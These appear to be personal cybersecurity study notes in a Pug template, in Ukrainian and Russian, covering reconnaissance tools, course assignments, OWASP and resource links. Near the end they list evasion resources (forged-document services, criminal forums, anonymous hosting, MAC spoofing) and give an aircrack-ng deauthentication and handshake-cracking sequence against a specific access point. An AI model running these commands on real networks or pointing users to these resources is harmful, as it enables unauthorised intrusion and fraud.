      //- Reconnaissance
      details
        summary Reconnaissance

        //- Dig & Whois
        details
            summary Dig & Whois
            p.
              <dfn>Dig</dfn>
              - Утиліта Unix-систем, що надає користувачеві інтерфейс командного рядка для звернення до системи DNS (DNS-клієнт). <br>
              - Dig англійською значить «копати», але формально — це скорочення від «domain information groper». <br>
              - Дозволяє задавати різні типи запитів i запитувати довільно вказані сервера. Має більше можливостей ніж подібна утиліта nslookup.<br>
            br
            p.
              <dfn>WHOIS</dfn>
              - Протокол запит/відповідь, що базується на TCP. 
              - Широко використовується для запитів бази даних для того, щоб визначити власника доменної зони, IP-адреси , або автономного системного номера в Інтернеті.

        //- Nmap & Gobuster  
        details
          summary Nmap & Gobuster
          p.
            Gobuster - пояснення з прикладами
            https://www.geeksforgeeks.org/gobuster-penetration-testing-tools-in-kali-tools/
          
            Nmap Cheat Sheet 2023: All the Commands, Flags & Switches
            https://www.stationx.net/nmap-cheat-sheet/
          
            Віртуалізація проти контейнеризації
            https://www.trianz.com/insights/containerization-vs-virtualization#:~:text=Virtualization%20aims%20to%20run%20multiple,to%20run%20multiple%20processes%20simultaneously
          
            Завдання 1
            * За допомогою nmap проскануйте scanme.nmap.org. 
            * Спочатку зробіть скан з параметрами по замовчуванням (тільки додайте запис в файл), потім додайте ключі -sC, -sV та проскануйте ВСІ порти. 
            * Вивід також перенаправте у файл. 
            * Надішліть 2 файла з результатами скану.
          
            Завдання 2
            * Зареєструйтеся та авторизуйтесь на порталі https://portal.offsec.com/sign-up/pg .
            * Підтвердіть пошту та завершіть покупку безкоштовного курсу (номера телефонів можна вказувати будь-які, кредитну картку не питає). Після завершення покупки вам буде доступний кабінет користувача.
            * Запустіть сканер dirb, dirbuster, gobuster чи аналогічний. В якості словника використовуйте цей. Розширте пошук на php, txt, pdf та zip файли. 
            * Прикріпіть скріншот або скріншоти, на яких видно параметри з якими ви запускали сканер та ресурси, якій він знайшов.
          
            Для запуску:
            завантажте vpn файл доступу
            підключіться до vpn на віртуальній машині kali linux
            sudo openvpn universal.ovpn
            після успішного підключення має загорітись зелений індикатор
            запустіть машину, наприклад під назвою FunboxEasyEnum
            після успішного старту вам дадуть ip-адресу цієї машини
          img(src="./img/web/nmap.png" alt="")
                        
        //- DAST
        details
          summary DAST
          p.
            Динамічне тестування безпеки додатків (DAST)
            - Процес тестування веб-додатків через веб-інтерфейс для пошуку вразливостей.
            - Додаткова інформація
            https://www.rapid7.com/fundamentals/dast/
            https://www.microfocus.com/en-us/what-is/dast                            
          img src="./img/web/DFD.png" alt="")
          img src="./img/web/ERD.png" alt="")
          img src="./img/web/UML.png" alt="")
          img src="./img/web/OSINT.png" alt="")
          img src="./img/web/Sens.png" alt="")
          img src="./img/web/subfinder.png" alt="")

    //- Resources
    details
      summary Resources                                    
      a(href="https://www.hacker101.com/") hacker101 <br>
      a(href="https://portswigger.net/web-security/all-labs") portswigger <br>
      a(href="https://www.root-me.org/?lang=en") root-me <br>
      a(href="https://www.hackerone.com/") hackerone <br>
      a(href="https://www.hackthebox.com/") hackthebox <br>
      a(href="https://www.globalknowledge.com/ca-en/topics/cybersecurity/glossary-of-terms/") glossary  <br>
      a(href="https://www.microsoft.com/uk-ua/security/business/security-101") microsoft  <br>
      a(href="https://kr-labs.com.ua/blog/testuvannya-na-pronyknennya-pentest-vid-a-do-ya/") kr-labs  <br>
      a(href="https://en.wikipedia.org/wiki/Information_security") IS  <br>
      a(href="https://en.wikipedia.org/wiki/Information_security_standards") Information_security_standards  <br>
      a(href="https://en.wikipedia.org/wiki/NIST_Cybersecurity_Framework") NIST_Cybersecurity_Framework  <br>
      a(href="https://umbrella.cisco.com/blog/cisco-umbrella-top-10-cybersecurity-tips") umbrella  <br>
      a(href="https://www.amazon.com/Routing-Switching-200-125-Official-Library/dp/1587205815") amazon   <br>
      br
      a(href="https://github.com/danielmiessler/SecLists") SecLists <br>
      a(href="https://github.com/swisskyrepo/PayloadsAllTheThings/") PayloadsAllTheThings <br>
      br
      a(href="https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198") byte <br>
      a(href="https://www.dcode.fr/tools-list") tools <br>
      a(href="https://www.coursera.org/learn/crypto") crypto <br>
      br
      a(href="https://www.cdn77.com/tls-test") cdn77 <br>
      a(href="https://www.ssllabs.com/ssltest/") ssltest <br>
      a(href="https://demo.owasp-juice.shop/#/") juice <br>
      a(href="https://bugcrowd.com/vulnerability-rating-taxonomy") bugcrowd<br>
      br
      a(href="https://cwe.mitre.org/") cwe<br>
      a(href="https://hackyourmom.com/") hackyourmom<br>
      a(href="https://hackcontrol.org/") hackcontrol<br>
      a(href="https://www.youtube.com/@gauravladekar/videos") kali<br>
      a(href="https://simplifiedprivacy.com/") simplifiedprivacy<br>
      br
      a(href="https://project-zero.issues.chromium.org/issues?q=") issues<br>
      a(href="https://www.shodan.io/") - веб-сканер устройств IoT, который поможет вам определить любые уязвимые устройства в Интернете.<br>
      p Wifi:<br>
      a(href="https://www.krackattacks.com/") krackattacks<br>
      a(href="https://www.fcc.gov/consumers/guides/how-protect-yourself-online") Wifi<br>
      a(href="https://pages.nist.gov/800-63-3/") Wifi<br>
      a(href="https://www.snort.org/") Net<br>
      p.
        Базы
        Одной из наиболее известных и уважаемых организаций по обучению кибербезопасности является Институт SANS.<br>
      a(href="https://www.sans.org/about/") SANS<br>
      p.
        <em>Форумом групп реагирования на инциденты по кибербезопасности (FIRST)</em>,<br>
        <em>Национальным обменом информацией по безопасности (NSIE)</em>,<br>
        <em>Обменом информации об оборонной безопасности (DSIE)</em> и<br>
        <em>Центром анализа и исследования операций DNS (DNS-OARC)</em>.<br>
        <dfn>Black Hat</dfn> — хакери, які прагнуть виконувати зловмисні дії.<br>
        <dfn>Gray Hat</dfn> — хакери, які виконують корисні та/або зловмисні.<br>
        <dfn>White Hat</dfn> — етичні хакери, вони застосовують свої навички для покращення стану безпеки викриваючи вразливості компаній/організацій.<br>
        <dfn>Script Kiddie / Skiddies</dfn> — особи без грунтовних навичок, які користуються готовими скриптами/експлойтами для проведення атак на ІТ-системи, додатки, програми тощо.<br>
        <dfn>State-Sponsored Hacker</dfn> — хакери, які найняті державою для спеціалізованих цілей.<br>
        <dfn>Hacktivist</dfn> — особа, яка займається зламами в своїх цілях.<br>
        <dfn>Cyberterrorist</dfn> — релігійно або політико мотивовані активісти, які виконують відповідні дії.<br>
        Команда компьютерной экстренной готовности США (US-CERT, United States Computer Emergency Readiness Team) и Министерство внутренней безопасности США поддерживают базу данных общеизвестных уязвимостей (CVE, Сommon Vulnerabilities and Exposures).
        Каждая запись CVE содержит стандартный идентификационный номер, краткое описание уязвимости и важные ссылки на относящиеся к этой уязвимости отчеты. Список CVE поддерживается некоммерческой организацией MITRE Corporation в актуальном состоянии и является общедоступным на ее веб-сайте.
        Автоматическое распространение признаков (AIS, Automated Indicator Sharing) – это функция Агентства кибербезопасности и безопасности инфраструктуры (CISA, Cybersecurity and Infrastructure Security Agency)
      a(href="https://www.caeepnc.org/social_engineering/")
      p <dfn>OWASP top 10</dfn> є визнаною світовою методологією оцінки вразливостей веб-додатків у всьому світі i відображає сучасні тренди безпеки веб-додатків, є першим кроком організації до створення культури більш безпечного коду програмного забезпечення.<br>
      a(href="https://owasp.org/www-project-top-ten/") Top 10 Web Application Security Risks<br>
      p.
        - Broken Access Control<br>
        - Cryptographic Failures<br>
        - Injection<br>
        - Insecure Design<br>
        - Security Misconfiguration<br>
        - Vulnerable and Outdated Components<br>
        - Identification and Authentication Failures<br>
        - Software and Data Integrity Failures<br>
        - Security Logging and Monitoring Failures<br>
        - Server-Side Request Forgery<br>
      img(src="./img/web/OWASP.png" alt="")
      img(src="./img/web/project.png" alt="")
      img(src="./img/web/projectTask.png" alt="")
      img(src="./img/web/vulnerability.png" alt="")
      img(src="./img/web/AbbiSecur.jpeg" alt="")
      img(src="./img/web/Security.jpeg" alt="")
      br
      a(href="https://www.indeed.com/") indeed<br>
      a(href="https://ua.linkedin.com/") linkedin<br>
      a(href="https://jobs.dou.ua/vacancies/?search=cybersecurity") dou<br>
      a(href="https://www.work.ua/jobs-cybersecurity/") work<br>
      br
      p.
        Zeus
        
        Keyboard Logging, Keylogging

        NetStumbler

        Metasploit -> Meterpreter

        getmonero.org <br>
        Bestchange <br>
        XCHANGE.me <br>
        Shadow socks?  <br>
        tox.chat <br>
        jitsi.org <br>
        mumble.com <br>
        jabber <br>
        secure sim card <br>
        crypton в tor <br>
        mosilla monitor <br>
        <ul>Хостинг
          <li>криптовалюта monero, zcash</li>
          <li>без гугл скриптов</li>
          <li>без cloud flair - облачная защита</li>
          <li>своё зеркало среди анонимных сетей</li>
          <li>страна вне договора 14 глаз</li>
          <li>host4coins.net</li>
          <li>bitVPS.com</li>
          <li>njal.la</li>
          <li>cockbox.org</li>
        </ul>
        IP-телефония <br>
        saveum <br>
        Купить аккаунты телеграмм <br>
        anonimayzer <br>
        yourdigitalrights.org <br>
        Dash cash <br>
        Zcash <br>
        verge currency <br>
        Проверить IP - 2IP.com <br>
        Сменить порт. <br>
        Fail2Ban - защита от брутфорса и DDos. <br>
        changeme <br>
        honeypot <br>
        OpenBSD <br>
        Devuan <br>
        i2p+xmpp <br>
        onlyFake - поддельные документы <br>
        onionmail.org<br>
        cryptwerk.com<br>
        xss.is<br>
        forum.exploit.in<br>
        freemyip.com - левый домен для сервера<br>
        - Information gathering (Reconnaissance)<br>
        - ping<br>
        - whois<br>
        - whatweb 192.168.100.1-192.168.100.255 -a 3 -v --no-errors --log-verbose=result<br>
        - theHarvester -d DOMAIN -b SOURCE (google)<br>
        - hunter.io (find email on domain)<br>
        - Scanning (game started)<br>
        - Gaining access (Exploitation)<br>
        - Maintaining access<br>
        - Covering tracks

        Ifconfig
        ifconfig
        ifconfig eth0 192.168.0.21 netmask 255.255.255.0 broadcast 192.168.0.255

        Ip
        ip a
        ip link set wlan0 down
        ifconfig wlan0 hw ether 14:de:d1:88:18:d4
        ip link set wlan0 up
        ip l


        lshw
        apt install lshw
        lshw -class network

        Ping and Traceroute
        ping ya.ru
        traceroute ya.ru
        traceroute -I ya.ru

        Netstat
        netstat -i
        netstat -lpn
        netstat -r

        MAC
        f8:db:88 - 
        f0:4d:a2 - 
        34:17:eb - 
        ip a
        macchanger -l
        ip link set wlp0s20f3 down
        sudo macchanger -m b2:aa:0e:56:ed:f7 enp0s3
        sudo macchanger -r wlp0s20f3
        sudo ip link set wlp0s20f3 up

        ssh
        sudo apt update
        sudo apt install openssh-server
        sudo systemctl status ssh
        q
        sudo ufw allow ssh
        ip a
        sudo systemctl disable --now ssh
        sudo systemctl enable --now ssh

        WG
        Server:
        curl -O https://raw.githubusercontent.com/angristan/wireguard-install/master/wireguard-install.sh
        chmod +x wireguard-install.sh
        ip -br a - publik IP
        ./wireguard-install.sh

        Client:
        sudo apt install wireguard
        sudo apt install resolvconf iptables
        sudo mv ~/wg0-client-losst.conf /etc/wireguard/wg0.conf
        wg-quick up wg0
        sudo wg show

ip a
iwconfig
airmon-ng stop wlan0
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng wlan0mon --bssid C4:6E:1F:61:B1:0C --channel 6 -w Stalingrad
aireplay-ng wlan0mon --deauth 0 -a C4:6E:1F:61:B1:0C -c clientMacAddr
aircrack-ng Stalingrad-01.cap -w passwordList.txt